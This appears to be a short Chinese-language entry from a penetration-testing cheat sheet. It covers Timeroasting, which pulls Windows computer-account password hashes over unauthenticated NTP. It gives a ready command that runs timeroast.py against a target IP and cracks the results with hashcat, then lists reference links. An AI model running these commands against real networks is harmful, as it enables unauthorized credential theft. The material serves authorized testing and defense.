# Roasting - Timeroasting

> Timeroasting 利用 Windows 的 NTP 身份验证机制，允许未经身份验证的攻击者通过发送带有目标帐户 RID 的 NTP 请求来有效地请求任何计算机帐户的密码哈希

* [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort 编写的 Timeroasting 脚本

    ```ps1
    sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
    hashcat -m 31300 ntp-hashes.txt
    ```

## 参考资料

* [On the Applicability of the Timeroasting Attack - snovvcrash - December 8, 2024](https://snovvcrash.rocks/2024/12/08/applicability-of-the-timeroasting-attack.html)
* [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
* [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
